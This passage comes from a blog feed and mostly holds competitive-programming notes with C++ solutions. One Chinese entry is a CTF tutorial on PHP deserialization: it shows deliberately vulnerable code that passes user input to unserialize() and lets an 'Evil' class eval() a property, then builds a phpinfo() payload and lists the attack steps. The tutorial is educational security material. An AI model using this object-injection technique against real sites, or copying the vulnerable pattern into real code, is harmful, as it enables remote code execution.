&quot;</span>;<br>&#125;<br><span class="hljs-comment">//if(p[n])cout&lt;&lt;max(c[n], maxn[p[n]]);</span><br><span class="hljs-comment">//else cout&lt;&lt;max(maxn[1], a[n]);</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Web-PHP反序列化</title>
      <link href="/2020/12/631a292b.html"/>
      <url>/2020/12/631a292b.html</url>
      
        <content type="html"><![CDATA[<h1 id="概念解释"><a href="#概念解释" class="headerlink" title="概念解释"></a>概念解释</h1><p>PHP 反序列化漏洞又叫做 PHP 对象注入漏洞，我觉得这个表达很不直白，也不能说明根本的问题，不如我们叫他 PHP 对象的属性篡改漏洞好了(别说这是我说的~~)</p><p>反序列化漏洞的成因在于代码中的 unserialize() 接收的参数可控，从上面的例子看，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现最终的攻击。</p><span id="more"></span><h1 id="魔法方法"><a href="#魔法方法" class="headerlink" title="魔法方法"></a>魔法方法</h1><ol><li>construct(): 当对象创建时会自动调用（但在unserialize()时不会自动调用）</li><li>wakeup(): unserialize()时会自动调用</li><li>destruct(): 当对象被销毁时会自动调用</li><li>toString(): 当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</li><li>get(): 当从不可访问的属性读取数据</li><li>call(): 在对象上下文中调用不可访问的方法时触发</li></ol><p>特别说明第四点：</p><p>_toString触发条件较多，因此容易被忽略，常见的触发条件如下：</p><blockquote><p>(1)echo (<code>$obj</code>) &#x2F; print(<code>$obj</code>) 打印时会触发</p><p>(2)反序列化对象与字符串连接时</p><p>(3)反序列化对象参与格式化字符串时</p><p>(4)反序列化对象与字符串进行&#x3D;&#x3D;比较时（PHP进行&#x3D;&#x3D;比较的时候会转换参数类型）</p><p>(5)反序列化对象参与格式化SQL语句，绑定参数时</p><p>(6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</p><p>(7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有<strong>toString返回的字符串的时候</strong>toString会被调用</p><p>(8)反序列化的对象作为 class_exists() 的参数的时候</p></blockquote><h1 id="魔法方法的作用"><a href="#魔法方法的作用" class="headerlink" title="魔法方法的作用"></a>魔法方法的作用</h1><p>反序列化了其他的类对象以后我们只是控制了是属性，如果你没有在完成反序列化后的代码中调用其他类对象的方法，我们还是束手无策，毕竟代码是人家写的，人家本身就是要反序列化后调用该类的某个安全的方法，你总不能改人家的代码吧，但是没关系，因为我们有魔法方法。</p><p>魔法正如上面介绍的，魔法方法的调用是在该类序列化或者反序列化的同时自动完成的，不需要人工干预，这就非常符合我们的想法，因此只要魔法方法中出现了一些我们能利用的函数，我们就能通过反序列化中对其对象属性的操控来实现对这些函数的操控，进而达到我们发动攻击的目的。</p><h1 id="利用魔法方法发起攻击"><a href="#利用魔法方法发起攻击" class="headerlink" title="利用魔法方法发起攻击"></a>利用魔法方法发起攻击</h1><h2 id="测试代码："><a href="#测试代码：" class="headerlink" title="测试代码："></a>测试代码：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">K0rz3n</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$K0rz3n</span> = <span class="hljs-string">&quot;i am K0rz3n&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">L</span>();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test-&gt;<span class="hljs-title function_ invoke__">action</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">L</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to XDSEC&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;<br><br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test2</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;test2);<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>我们先来分析一下这段代码，首先我们能看到 unserialize() 函数的参数我们是可以控制的，也就是说我们能通过这个接口反序列化任何类的对象(但只有在当前作用域的类才对我们有用)，那我们看一下当前这三个类，我们看到后面两个类反序列化以后对我们没有任何意义，因为我们根本没法调用其中的方法，但是第一个类就不一样了，虽然我们也没有什么代码能实现调用其中的方法的，但是我们发现他有一个魔法函数 __destruct() ，这就非常有趣了，因为这个函数能在对象销毁的时候自动调用，不用我们人工的干预，好，既然这样我们就决定反序列化这个类的对象了，接下来让我们看一下怎么利用(我上面说过了，我们需要控制这个类的某些属性，通过控制属性实现我们的攻击)</p><p>那我们看一下哪些属性的控制是对我们有用的(这个时候我们就跳过了<strong>construct() 方法，毕竟他永远不会被调用)，因为这个例子比较简单，</strong>destruct() 里面只用到了一个属性 test ，那肯定就是他了，那我们控制这个属性为什么内容我们就能攻击了呢，我们再观察一下 那些地方调用了 action() 函数，看看这个函数的调用中有没有存在执行命令或者是其他我们能利用的点的，果然我们在 Evil 这个类中发现他的 action() 函数调用了 eval(),那我们的想法就很明确了，我们需要将 K0rz3n 这个类中的 test 属性篡改为 Evil 这个类的对象，然后为了 eval 能执行命令，我们还要篡改 Evil 对象的 test2 属性，将其改成我们的 Payload</p><p>分析完毕以后我们就可以构建我们的序列化字符串了，构建的方法不是手写(当然你愿意我也不拦着你，理论上是可行的)，我们要将这段代码复制一下，然后修改一些内容并进行序列化操作</p><h2 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">K0rz3n</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Evil</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;<br><br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test2</span> = <span class="hljs-string">&quot;phpinfo();&quot;</span>;<br><br>&#125;<br><br><span class="hljs-variable">$K0rz3n</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">K0rz3n</span>;<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$K0rz3n</span>);<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;seria.txt&quot;</span>, <span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure><p>我们去除了一切与我们要篡改的属性无关的内容，对其进行序列化操作，然后将序列化的结果复制出来，向刚刚的代码发起请求。可以看到我们攻击成功，特别要提醒一下的就是我在图中框起来的部分，上面说过由于是私有属性，他有自己特殊的格式会在前后加两个 %00 ，所以我们在传输过程中绝对不能忘掉。</p><h2 id="反序列化漏洞方法小结"><a href="#反序列化漏洞方法小结" class="headerlink" title="反序列化漏洞方法小结"></a>反序列化漏洞方法小结</h2><ol><li>寻找unserialize()函数的参数是否有可控点</li><li>寻找反序列化目标，重点为***wakeup()或destruct()***魔法函数的类</li><li>一层一层的研究该类在魔法方法中使用的属性和属性调用的方法，看看是否有可控的属性能实现在当前调用的过程中触发的</li><li>找到要控制的属性之后将要用到的代码部分复制下来，构造序列化，发起攻击</li></ol><p><em><strong>To Be Continued</strong></em></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>位运算-1</title>
      <link href="/2020/12/35ff10df.html"/>
      <url>/2020/12/35ff10df.html</url>
      
        <content type="html"><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><h2 id="DPL-3-A-Largest-Square"><a href="#DPL-3-A-Largest-Square" class="headerlink" title="DPL_3_A: Largest Square"></a>DPL_3_A: Largest Square</h2><span id="more"></span><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX 1400</span><br><br><span class="hljs-type">int</span> dp[MAX][MAX], G[MAX][MAX];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getS</span><span class="hljs-params">(<span class="hljs-type">int</span> H,<span class="hljs-type">int</span> W)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> maxWidth = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;H;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;W;j++)<br>        &#123;<br>            dp[i][j]=(G[i][j]+<span class="hljs-number">1</span>)%<span class="hljs-number">2</span>;<br>            maxWidth |= dp[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;H;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;W;j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(G[i][j])<br>            &#123;<br>                dp[i][j]=<span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                dp[i][j]=<span class="hljs-built_in">min</span>(dp[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>], <span class="hljs-built_in">min</span>(dp[i<span class="hljs-number">-1</span>][j], dp[i][j<span class="hljs-number">-1</span>])) + <span class="hljs-number">1</span>;<br>                maxWidth=<span class="hljs-built_in">max</span>(maxWidth, dp[i][j]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> maxWidth * maxWidth;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> H,W;<br>    cin&gt;&gt;H&gt;&gt;W;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;H;i++)<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;W;j++)<br>            cin&gt;&gt;G[i][j];<br>        cout&lt;&lt;<span class="hljs-built_in">getS</span>(H,W)&lt;&lt;endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="研究"><a href="#研究" class="headerlink" title="研究"></a>研究</h1><p>关于%&#x3D;与|&#x3D;运算的介绍</p><blockquote><p>a &amp;&#x3D; b,就是将a与b做按位“与”运算，结果赋值给a,也就相当于a &#x3D; a &amp; b;<br>a |&#x3D; b就是将a,b 做按位”或“运算，结果给a,相当于a &#x3D; a | b;</p><p>（&amp;与运算只有1&amp;1才等于1，其余1&amp;0、0&amp;1、0&amp;0都为0；|或运算只有0&amp;0才等于0，其余1&amp;0、0&amp;1、1&amp;1都为1）</p><p>在嵌入式开发中，经常会操作寄存器，对寄存器进行配置。<br>&amp;&#x3D; 一般用在复位，即清零，将&#x3D;号后面0的位清零，1的位保持不变。|&#x3D; 一般用在置位，即置1，1的位置1，0的位保持不变。<br>两者结合一起用，先复位，后置位。</p><p>例如：（若看不懂请将16进制转为2进制再运算）<br>GPIOA-&gt;CRL &amp;&#x3D; 0X000FFFFF; 清掉这 3 个位原来的设置，同时也不影响其他位的设置<br>GPIOA-&gt;CRL |&#x3D; 0XBBB00000;将这 3 个位设置为想要的值，同时也不影响其他位的设置</p><p>总结：&amp;&#x3D;看0的位；|&#x3D;看1的位。</p></blockquote><p>题中19行在对dp数组记录进行逆变换后，对maxWidth变量进行了|&#x3D;操作，目的是为了获取当前最大的Width，此处maxWidth变量非0即1，成1后便不再还原</p>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM-学习记录-DP-1</title>
      <link href="/2020/11/2470a0b3.html"/>
      <url>/2020/11/2470a0b3.html</url>
      
        <content type="html"><![CDATA[<h1 id="DPL-1-A-Coin-Changing-Problem"><a href="#DPL-1-A-Coin-Changing-Problem" class="headerlink" title="DPL_1_A: Coin Changing Problem"></a>DPL_1_A: Coin Changing Problem</h1><p>每次均有两种选择，即选择当前的，即为在当前状态+1，否则维持原来的T[j+d[i]]</p><span id="more"></span><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdlib&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> INF=(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">29</span>);<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n,m;<br><span class="hljs-type">int</span> d[<span class="hljs-number">20</span>+<span class="hljs-number">5</span>];<br><span class="hljs-type">int</span> T[<span class="hljs-number">50000</span> + <span class="hljs-number">5</span>];<br>cin&gt;&gt;n&gt;&gt;m;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)<br>cin&gt;&gt;d[i];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">50000</span>+<span class="hljs-number">5</span>;i++)<br>&#123;<br>T[i]=INF;<br>&#125;<br>T[<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;<br><span class="hljs-comment">//for(int i=0;i&lt;=50000+5;i++)cout&lt;&lt;T[i]&lt;&lt;endl;</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j+d[i]&lt;=n;j++)<br>&#123;<br>T[j + d[i]] = <span class="hljs-built_in">min</span>(T[j+d[i]], T[j]+<span class="hljs-number">1</span>);<br>&#125;<br>&#125;<br>cout&lt;&lt;T[n]&lt;&lt;endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="DPL-1-B-0-1-Knapsack-Problem"><a href="#DPL-1-B-0-1-Knapsack-Problem" class="headerlink" title="DPL_1_B: 0-1 Knapsack Problem"></a>DPL_1_B: 0-1 Knapsack Problem</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NMAX 105</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WMAX 10005</span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Item</span>&#123;<br><span class="hljs-type">int</span> value;<br><span class="hljs-type">int</span> weight;<br>&#125;;<br><br><span class="hljs-type">int</span> N,W;<br>Item items[NMAX];<br><span class="hljs-type">int</span> C[NMAX][WMAX], G[NMAX][WMAX];<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">compute</span><span class="hljs-params">(<span class="hljs-type">int</span> &amp;maxValue, vector&lt;<span class="hljs-type">int</span>&gt; &amp;selection)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> w=<span class="hljs-number">0</span>;w&lt;=W;w++)<br>&#123;<br>C[<span class="hljs-number">0</span>][w]=<span class="hljs-number">0</span>;<br>G[<span class="hljs-number">0</span>][w]=<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=N;i++)<br>C[i][<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=N;i++)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> w=<span class="hljs-number">1</span>;w&lt;=W;w++)<br>&#123;<br>C[i][w]=C[i<span class="hljs-number">-1</span>][w];<br>G[i][w]=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(items[i].weight&gt;w)<span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">if</span>(items[i].value + C[i<span class="hljs-number">-1</span>][w-items[i].weight]&gt;C[i<span class="hljs-number">-1</span>][w])<br>&#123;<br>C[i][w]=items[i].value + C[i<span class="hljs-number">-1</span>][w-items[i].weight];<br>G[i][w]=<span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br>&#125;<br>maxValue=C[N][W];<br>selection.<span class="hljs-built_in">clear</span>();<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=N,w=W;i&gt;=<span class="hljs-number">1</span>;i--)<br>&#123;<br><span class="hljs-keyword">if</span>(G[i][w]==<span class="hljs-number">1</span>)<br>&#123;<br>selection.<span class="hljs-built_in">push_back</span>(i);<br>w-=items[i].weight;<br>&#125;<br>&#125;<br><span class="hljs-built_in">reverse</span>(selection.<span class="hljs-built_in">begin</span>(), selection.<span class="hljs-built_in">end</span>());<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> maxValue;<br>vector&lt;<span class="hljs-type">int</span>&gt; selection;<br>cin&gt;&gt;N&gt;&gt;W;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=N;i++)<br>&#123;<br>cin&gt;&gt;items[i].value&gt;&gt;items[i].weight;<br>&#125;<br><span class="hljs-built_in">compute</span>(maxValue, selection);<br>cout&lt;&lt;maxValue&lt;&lt;endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="NEFUOJ-P21-最长上升子序列"><a href="#NEFUOJ-P21-最长上升子序列" class="headerlink" title="NEFUOJ P21 最长上升子序列"></a>NEFUOJ P21 最长上升子序列</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX 100000</span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">int</span> n,A[MAX+<span class="hljs-number">1</span>],L[MAX];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">lis</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    L[<span class="hljs-number">0</span>]=A[<span class="hljs-number">0</span>];<br>    <span class="hljs-type">int</span> length=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(L[length<span class="hljs-number">-1</span>]&lt;A[i])<br>        &#123;<br>            L[length++]=A[i];<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            *<span class="hljs-built_in">lower_bound</span>(L, L+length, A[i])=A[i];<br>    &#125;<br>    <span class="hljs-keyword">return</span> length;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        cin&gt;&gt;A[i];<br>    &#125;<br>    cout&lt;&lt;<span class="hljs-built_in">lis</span>()&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="DPL-3-A-Largest-Square"><a href="#DPL-3-A-Largest-Square" class="headerlink" title="DPL_3_A: Largest Square"></a>DPL_3_A: Largest Square</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX 